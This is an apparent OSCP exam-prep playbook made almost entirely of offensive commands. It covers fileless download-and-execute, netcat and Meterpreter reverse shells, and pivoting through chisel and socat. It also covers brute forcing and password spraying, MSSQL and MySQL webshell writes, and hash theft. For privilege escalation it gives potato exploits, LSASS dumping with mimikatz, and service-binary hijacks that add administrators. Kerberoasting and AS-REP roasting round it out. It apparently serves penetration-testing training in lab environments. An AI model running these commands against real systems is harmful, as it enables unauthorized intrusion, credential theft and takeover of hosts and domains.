# OSCP PlayBook

## Table of Contents
- [Utility](#utility)
    - [File Transfer](#file-transfer)
    - [Pivot](#pivot)
    - [Upgrade Shell](#upgrade-shell)
- [Recon](#recon)
    - [Nmap](#nmap)
    - [Services](#services)
        - [FTP](#ftp-port-21)
        - [SSH](#ssh-port-22)
        - [Http/ Https](#http-https-ports-80-443)
        - [SMB/ Samba](#smb-samba-ports-137-138-139-445)
        - [SMTP](#smtp-ports-25-587-465)
        - [IMAP/ POP3](#imap-pop3-ports-110-143-993-995)
        - [MSSQL](#mssql-port-1433)
        - [MySQL](#mysql-port-3306)
    - []()
- [Enumeration](#enumeration)
    - [Linux](#linux)
    - [Windows](#windows)
- [Exploit](#exploit)
    - [Linux](#linux-exploit)
    - [Windows](#windows-exploit)
- [Active Directory](#active-directory)

## Utility
#### File Transfer
```c
#Linux
    ##Upload
        python3 -m http.server
        python2.7 -m SimpleHTTPServer
        php -S 0.0.0.0:8000
        scp /etc/passwd User@IP:/home/User/
    ##Download
        wget http://IP/file.txt -O /Downloads
        curl -o /Downloads url.com/file.txt
        scp User@IP:/root/myroot.txt .
        ###Fileless
            curl url.com/file.sh | bash
            wget -q0- url.com/file.py | python3

#Windows
    ##PS1
        ###Upload
            IEX(New-Object Net.WebClient).DownloadString('file url')
            Invoke-FileUpload -Uri http://Local IP:8000/upload -File C:\Windows\System32\drivers\etc\hosts
            SMB
                On Linux: sudo impacket-smbserver share /home/kali -smb2support
                On CMD: copy system.save \\IP\share\system.save

                On Linux: impacket-smbserver hax $(pwd) -smb2support
                On PS or CMD: copy C:\temp\supersecret.txt \\A_IP\hax\supersecret.txt
        ###Download
            (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
            Invoke-WebRequest target file url -OutFile PowerView.ps1
            SMB
                On Linux: impacket-smbserver hax $(pwd) -smb2support
                On PS or CMD: copy \\A_IP\hax\nc.exe C:\temp\nc.exe

            ####File less
                IEX (New-Object Net.WebClient).DownloadString('Target File Url')
                (New-Object Net.WebClient).DownloadString('Target File URL') | IEX

    ##CMD
        ###Upload
        ###Download
            certutil -urlcache -f -split http://IP/file.txt
```

#### Pivot
```c
A <-> B <-> C
#Chisel - Must have a shell on B
    On A: cd /opt/priv_esc_windows/ -> sudo python3 -m http.server 80
    On B cmd: certutil -urlcache -split -f http://A_IP/nc.exe
    On A: nc -lvnp 4444
    On B: nc A_IP 4444 -e cmd.exe
        This creates reverse shell
    On A: Download [chisel](https://github.com/jpillora/chisel/releases) then upload it to B
    On A: ./chisel server -p 8000 --reverse
    On B: chisel A_IP:8000 R:socks   -> looking for it to say connected
    On A: edit /etc/proxychains.conf -> last line: socks5 127.0.0.1 1080
    On A: proxychains COMMAND  ->  now we can run commands against C

#Socat - Must have a shell on B
    ##Reverse
        On B: socat TCP4-LISTEN:8080,fork TCP4:A_IP:PORT
        Craft payload: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=B_IP -f exe -o backupscript.exe LPORT=8080
        Upload to B then to A
        On A: msf: use exploit/multi/handler -> set payload windows/x64/meterpreter/reverse_https, set lhost 0.0.0.0, port PORT, run
    ##Bind shell
        Craft payload: msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
        Get payload on B
        On B, start bind listener: socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
        On A: msf -> use exploit/multi/handler -> set payload windows/x64/meterpreter/bind_tcp, set RHOST B_IP, set LPORT 8080

```

#### Upgrade Shell
```c
#Python
    which python
        python -c 'import pty; pty.spawn("/bin/bash")'
    which python3
        python3 -c 'import pty; pty.spawn("/bin/bash")'
#Bin
    /bin/sh -i
    /bin/bash -i
```

## Recon

#### Nmap
```c
#Quick scan
nmap -p- IP

#Thorough scan
sudo nmap -sC -sV -p- IP 

#UDP Scan
sudo nmap -sU IP

#Script/ Vulnerability Scan
cd /usr/share/nmap/scripts; ls | grep SERVICE (smb, ftp)
    SMB
        nmap --script "smb-vuln*" -p 139,445 IP
```
#### Ping sweep
```c
#Bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

#CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

#PowerShell
1..254 | % {"172.16.5.$($*): $(Test-Connection -count 1 -comp 172.15.5.$($*) -quiet)"}
```

### Services

#### FTP Port 21
```c
#Connect
ftp IP PORT
nc -nv IP PORT
telnet IP PORT
openssl s_client -connect IP:PORT -starttls ftp

#anonymous login, try both
ftp anonymous@IP
username: anonymous password: blank
username: anonymous password: anonymous

#Brute Force login
hydra -L username.list -P password.list ftp://IP
```
#### SSH Port 22
```c
#Connect
ssh username@IP
ssh username@IP -p PORT

#Connect with Key
chmod 600 rsa_key
ssh -i rsa_key username@IP 

#Brute Force Login
hydra -L username.list -P password.list ssh://IP
```

#### HTTP/ HTTPS Ports 80/ 443
```c
#Subdomain Enumeration
ffuf -w wordlist.txt -u http://FUZZ.IP:PORT

#Directory Enumeration
ffuf -w wordlist.txt -u http://IP:PORT/FUZZ -recursion
##Exentsion Fuzz
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://IP:PORT/blog/indexFUZZ

##Parameter Fuzz
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://IP:PORT/admin/admin.php?FUZZ=key

#HTTP/S Brute Force
hydra -L user.txt -P pass.list IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

#### SMB/ Samba Ports 137, 138, 139, 445
```c
Windows
    cmd:
        # Connect
        dir \\IP\Share
        net use n: \\IP\Share /user:user Password

        # Enumerate
        dir n: /a-d /s /b | find /c ":\"
        n:\*name* /s /b
    PS1:
        # Connect
        Get-ChildItem \\IP\Share
        New-PSDrive -Name "N" -Root "\\IP\Share" -PSProvider "FileSystem"

        # With credentials
        $password = 'abc' 
        $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
        Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

Linux
    # Enumerate Shares
    smbclient -N -L //IP
    smbmap -H IP
    crackmapexec smb IP --shares -u '' -p ''

    # Enumerate Users/ Passwords
    hydra -L user.list -P password.list smb://IP
    MSF Smb_Login
    crackmapexec smb IP -u userlist.txt -p password.txt --local-auth

    # Login
    smbclient -U user //IP/share

    # Mount Drive
    sudo mkdir /mnt/test
    sudo mount -t cifs -o username=Username,password=Password,domain=. //IP/Share /mnt/test
```

#### SMTP Ports 25, 587, 465
```c
#Enumeration
    snmp-check IP  >  clamav-milter  /usr/local/sbin/clamav-milter  --black-hole-mode  >  ./4761.pl IP  >  nc -nv IP 31337  >  rooted
```

#### IMAP/ POP3 Ports 110, 143, 993, 995
```c
#Misconfiguration
telnet IP 25
    - VRFY username
    - EXPN group_name
    - RCPT TO name
    - USER name
smtp-user-enum -M RCPT -U userlist.txt -D domain_name -t IP
python3 o365spray.py --validate --domain domain_name
python3 o365spray.py --enum -U users.txt --domain domain_name

#Brute Force
hydra -L users.txt -P pass.txt -f IP pop3
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain domain_name

#Open relay
nmap -p25 -Pn --script smtp-open-relay IP
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: ' --body '' --server IP

#IMAP
    #Connect
    openssl s_client -connect IP:imaps
    tag login user pass
    #Commands
    tag LIST "" *
    tag SELECT name
    #How to access email
    tag FETCH 1 (BODY[HEADER])
    tag FETCH 1 BODY[TEXT]

#POP3
    #Connect
    openssl s_client -connect IP:pop3s
    telnet IP 110
    #Commands
    USER username
    PASS password
    LIST
    RETR id
```

#### MSSQL Port 1433
```c
#Connect
    Linux
        python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py username@IP -windows-auth
        sqsh -S IP -U username -P Password123
    Windows
        sqlcmd -S IP -U username -P Password123

#Commands
    Setup
        xp_cmdshell 'whoami'
        GO

#Exploits
    Stealing Hashes
        On Attack: sudo responder -I tun0
        On Target:
            EXEC master..xp_dirtree '\\local IP\share\' -> GO
            EXEC master..xp_subdirs '\\local IP\share\' -> GO
        On Attack:
            sudo impacket-smbserver share ./ -smb2support 
            hashcat -m 5600 wordlist hash_file

    Impersonate User
        SELECT distinct b.name -> FROM sys.server_permissions a -> INNER JOIN sys.server_principals b -> ON a.grantor_principal_id = b.principal_id -> WHERE a.permission_name = 'IMPERSONATE' -> GO
        SELECT SYSTEM_USER -> SELECT IS_SRVROLEMEMBER('sysadmin') -> GO
        If returns 0
            EXECUTE AS LOGIN = 'sa' ->SELECT SYSTEM_USER -> SELECT IS_SRVROLEMEMBER('sysadmin') -> GO

    Write Local Files
        Enable ole automation procedures
            sp_configure 'show advanced options', 1 -> GO -> RECONFIGURE -> GO -> sp_configure 'Ole Automation Procedures', 1 -> GO -> RECONFIGURE -> GO
        Create file
            DECLARE @OLE INT -> DECLARE @FileID INT -> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT -> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1 -> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>' -> EXECUTE sp_OADestroy @FileID -> EXECUTE sp_OADestroy @OLE -> GO
        Read local file
            SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents -> GO

```

#### MySQL Port 3306
```c
#Connect
    #Local access
    mysql -u user -p pass
    #External
    mysql -u username -ppass -h IP

#Commands
    show databases;
    select version();
    use database;
    show tables;
    show columns from table;
    select * from <table> where <column> = "<string>";

#SQLi
    #Write to local file
        SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
        Then navigate to directory and do webshell.php?c=COMMAND
    #Read local file
        select LOAD_FILE("/etc/passwd");
    #Find file privilege
        show variables like "secure_file_priv";
```
#### Rsync Port 873
```c
#Enumerate
    rsync IP::   - shows available shares
    rsync -av --list-only rsync://IP/share_name   - shows content of share
    rsync -av rsync://IP/shared_name ./rsyn_shared   - copy all files to local machine
#Exploit
    ##Upload ssh key and try to ssh in
        mkdir .ssh && cp ~/.ssh/id_rsa_pub .ssh/authorized_keys
        rsync -r ./.ssh/ IP::share_name/.ssh
        ssh -i ~/.ssh/id_rsa share_name@IP
```
### OSINT
```c

```


## Enumeration

### Linux
```c
#SUID
    find / -type f -perm -04000 -ls 2>/dev/null

#Cron
    cat /etc/crontab
    ls -la /etc/cron.daily/

#Host Info
    cat /etc/os-release
    uname -a  or  cat /proc/version
    cat /etc/lsb-release
    /etc/sudoers  -  who can run what as sudo
    env:  shows environment variables
    cat /etc/shells:  what shells can run on target

#User Info
    whoami:  what user are we
    id:  what groups
    lastlog:  Last login date/time
    hostname:  what is server name
    sudo -V:  sudo version
    sudo -l:  what can we run as sudo
    Execute as different user
        find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
        find / -uid 0 -perm -6000 -type f 2>/dev/null

#Files
    Writeable
        Directories:  find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
        Files:  find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
    Hidden
        Directories:  find / -type d -name ".*" -ls 2>/dev/null
        Files:  find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
    Credential
        etc/passwd
        etc/shadow
        find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

#Network info
    ifconfig or ip -a:  ip information
    route  or  netstat -rn:  Available networks
    /etc/resolv.conf:  find DNS information
    arp -a:  see arp table

#Services
    ps aux | grep root
    ps au
    apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

```
### Windows
```c
#System Info
    tasklist /svc  -  running services
    set  -  Path variables
    systeminfo  -  config info
    [environment]::OSVersion.Version - Window Version
    wmic qfe  -  Patch level
    cmd /c echo %PATH%  -  PATH variable
    CMD
        wmic qfe  -  Displays available patches
        wmic product get name  -  Installed programs
        Named Pipes
            pipelist.exe /accepteula
            accesschk.exe /accepteula \.\Pipe\lsass -v
            accesschk.exe -accepteula -w \pipe\WindscribeService -v
    PS1
        Get-HotFix | ft -AutoSize  -  Displays available patches
        Get-WmiObject -Class Win32_Product | select Name, Version  -  Installed programs
        Named Pipes:  applications/ processes that share information
            gci \.\pipe\

#User Info
    whoami
    whoami /priv
    whoami /groups
    whoami /user
    query user  -  logged in users
    echo %USERNAME%  -  current user
    net user  -  all users
    net localgroup  -  all groups
    net localgroup Group_Name  -  info about a group
    net accounts  -  password policy
    
#Network Info
    ipconfig /all
    arp -a
    route print
    netstat -ano  -  Running processes  -  Use tasklist /svc and the PID to find the name

#Credential Hunting
    /windows/panther/unattend.xml
    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.dll *.mof
    findstr /si password *.xml *.ini *.txt *.config *.dll *.mof
    findstr /spin "password" *.*
    (Get-PSReadLineOption).HistorySavePath
    cmdkey /list

#Scheduled Tasks
    schtasks /query /fo LIST /v
    Get-ScheduledTask | select TaskName,State
```
## Exploit

### Linux Exploit
```c
```
### Windows Exploit
```c
whoami /priv
    SeImpersonatePrivilege - Enabled
        Juicy Potato
            #Option1
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
            ./JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\shell-x64.exe -e cmd.exe" -t * -c "{CLSID}"
            #Option2
            MSF > m16_075_reflection_juicy > set options > set session
        PrintSpoofer
            #Option1
                PrintSpoofer64.exe -i -c cmd
            #Option2
                printerspoofer.exe -c "C:\shell-x64.exe"  >  nc -lvnp PORT
        RoguePotato
            #Option1
                On A: sudo socat tcp-listen, reuseaddr, ford tcp:B_IP:9999  >  nc -lvnp PORT
                On B: Rougepotato.exe -r A_IP -e "C:\shell-x64.exe" -l 9999

    SeDebugPrivilege - Enabled
        Procdump
            procdump.exe -accepteula -ma lsass.exe lsass.dmp
            Load file into mimikatz  -  mimikatz.exe  >  log  >  sekurlsa::minidump filepath/lsass.dmp  >  sekurlsa::logonpasswords
            Other option: Task manager  > Details  >  LSASS,  right click,  create dump,  save file to A and run mimikatz
        RCE as SYSTEM<a href=https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1>psgetsys.ps1</a>
            import-module psgetsys.ps1  >  [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
            PID:  tasklist  -  looking for winlogon.exe PID  or  (Get-Process "lsass").Id
            Command: "c:\Windows\System32\cmd.exe"

    SeTakeOwnershipPrivilege - Disabled and SeChangeNotifyPrivilege - Enabled https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
        Import-Module .\Enable-Privilege.ps1  >  .\EnableAllTokenPrivs.ps1  >  whoami /priv  -  TakeOwnership Enabled
        Choose a file:  cmd /c dir /q 'C:\Department Shares\Private\IT'
        Take ownership:  takeown /f 'C:\Department Shares\Private\IT\cred.txt'  >  Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
        Modify ACL:  type file  - is denied  >  icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F  >  type file

whoami /groups
    Check joplin notes for exploit route
    Backup Operators
    Event Log Readers
    DNSAdmins
    Hyper-V Administrators
    Printer Operator
    Server Operators

Registry
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer  -  AlwaysInstallElevated set to 1
        On A: 
            MSF  >  use multi/handler  >  set payload windows/meterpreter/reverse_tcp  >  set lhost A_IP  >  run
            msfvenom -p windows/meterpreter/reverse_tcp lhost=A_IP -f msi -o setup.msi  >  transfer to B  python3 -m http.server
        On B: 
            Invoke-WebRequest http://A_IP:8000/setup.msi -OutFile setup.msi
            Move file to C:\temp  >  PS: msiexec /quiet /qn /i C:\Temp\setup.msi  >  should have shell on MSF
            
Service Escalation
    Registry
        On B PS:  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl  -  user has “NT AUTHORITY\INTERACTIVE” “FullContol”
        On A:
            wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c  >  edit file and change system line to system("cmd.exe /k net localgroup administrators user /add")
            x86_64-w64-mingw32-gcc windows_service.c -o x.exe  >  transfer to B  python3 -m http.server
        On B:
            Invoke-WebRequest http://A_IP:8000/x.exe -OutFile x.exe
            Put file in C:/Temp  >  cmd:  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
            sc start regsvc  >  check if user acc was added:  net localgroup administrators
    Exe
        On B: cmd: C:\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"  >  Everyone group has FILE_ALL_ACCESS for filepermservice.exe
        On A:
            wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c  >  edit file and change system line to system("cmd.exe /k net localgroup administrators user /add")
            x86_64-w64-mingw32-gcc windows_service.c -o x.exe  >  transfer to B  python3 -m http.server
        On B:
            Invoke-WebRequest http://A_IP:8000/x.exe -OutFile x.exe
            Option1
            Put file in "C:\Program Files\File Permissions Service" > sc start filepermsvc  >  net localgroup administrators
            Option2
            Put file in C:/Temp  >  cmd:  copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"  >  sc start filepermsvc  >  net localgroup administrators

    Startup Apps
    DLL Hijack
    binPath
    Unquoted Service Path
```

## Active Directory
### Enumeration
#### Passive
```c
Linux
sudo tcpdump -i ens224

sudo responder -I ens224 -v

Windows
.\Inveigh.exe

```

#### Active
```c
# Ping Sweep
    - Linux
        for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
        fping -asgq 172.16.5.0/23

    - Windows
        CMD: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
        PS1: 1..254 | % {"172.16.5.$($*): $(Test-Connection -count 1 -comp 172.15.5.$($*) -quiet)"}


# User Enumeration
    - Linux
        ldapsearch -H ldap://DC_IP -x -b "DC=hutch,DC=offsec" > ldap.txt
        kerbrute userenum -d DOMAIN_NAME --dc DC_IP username_wordlist.txt -o valid_ad_users
        enum4linux -U IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
        rpcclient -U "" -N IP
        crackmapexec smb IP --users

    # Need valid credentials
    - Linux
        sudo crackmapexec smb CD_IP -u valid_user -p valid_pass (--users or --groups or --loggedon-users or --shares or -M spider_plus --share 'sharename')
        python3 windapsearch.py --dc-ip DC_IP -u USERNAME@DOMAIN_NAME -p Password --da
        python3 windapsearch.py --dc-ip DC_IP -u USERNAME@DOMAIN_NAME -p Password -PU
    - Windows


# Get Password Policy
    - Linux
        crackmapexec smb IP -u username -p password --pass-pol
        rpcclient -U "" -N IP  ->  querydominfo
        ldapsearch -h IP -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
        enum4linux -P IP
        enum4linux-ng -P IP -oA file.txt
    - Windows
        CMD
            net use \\host\ipc$ "" /u:""
            net accounts
        PS1
            import-module .\PowerView.ps1  ->  Get-DomainPolicy


# Password Spray
    - Linux
        for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" IP | grep Authority; done
        kerbrute passwordspray -d DOMAIN_NAME --dc IP valid_users.txt Password
        sudo crackmapexec smb IP -u valid_users.txt -p Password123 | grep +
        sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
    - Windows
        Import-Module .\DomainPasswordSpray.ps1
        Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue


# Enumerate Secruity Controls
    - Windows
        Get-MpComputerStatus
        Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
        $ExecutionContext.SessionState.LanguageMode
        Find-LAPSDelegatedGroups
        Find-AdmPwdExtendedRights
        Get-LAPSComputers
```



### Exploit
```c
# Connect from Linux
    xfreerdp /v:IP /u:USER /p:PASS
    psexec.py inlanefreight.local/USER:'PASS'@IP
    wmiexec.py inlanefreight.local/USER:'PASS'@IP
    evil-winrm -i IP -u USER -p PASS

# Kerberoast
    ## Linux
        List SPNs:  GetUserSPNs.py -dc-ip DC_IP INLANEFREIGHT.LOCAL/USER
        Request TGS
            All:  GetUserSPNs.py -dc-ip DC_IP INLANEFREIGHT.LOCAL/USER -request -outputfile all_tgs
            Single:  GetUserSPNs.py -dc-ip DC_IP INLANEFREIGHT.LOCAL/USER -request-user username -outputfile username_tgs
        Crack:  hashcat -m 13100 tgs /usr/share/wordlists/rockyou.txt
        Test creds:  sudo crackmapexec smb IP -u USER -p PASS

    ## Windows
        Powerview
            Import-Module .\PowerView.ps1  ->  Get-DomainUser * -spn | select samaccountname
            Target single user:  Get-DomainUser -Identity SAM | Get-DomainSPNTicket -Format Hashcat
            Target all users:  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
        Rubeus
            .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
            .\Rubeus.exe kerberoast /user:USER /nowrap
            Check encryption
                Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
                If it says 0 or 23 then RC4 encryption: hashcat -m 1000 hash rockyou.txt
                If it says 17, 18, 24:  hashcat -m 19700 hash rockyou.txt
    ## Attacks
        AS-REQ/ AS-REP Roast  -  pre-authentication must be disabled
            Windows
                Turn on Pre-auth:  Import-Module .\PowerView.ps1  >  Set-DomainObject -Identity USER -XOR @{useraccountcontrol=4194304} -Verbose
                Enumeration
                    PowerView: Import-Module .\PowerView.ps1  >  Get-DomainUser -UACFilter DONT_REQ_PREAUTH
                    Rubeus: Rubeus.exe asreproast /format:hashcat
                Attack
                    .\Rubeus.exe asreproast /user:USER /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
                    hashcat.exe -m 18200 C:\Tools\hashes.txt C:\Tools\rockyou.txt -O
            Linux
                sudo nano /etc/hosts > DC_IP Domain_name
                Enumeration
                    List Users:  GetNPUsers.py inlanefreight.local/username
                    List of users with a hash:  GetNPUsers.py inlanefreight.local/pixis -request
                Attack
                    Find ASREP Roastable accounts:  GetNPUsers.py INLANEFREIGHT/ -dc-ip DC_IP -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
                    hashcat -m 18200 hashes.txt rockyou.txt
```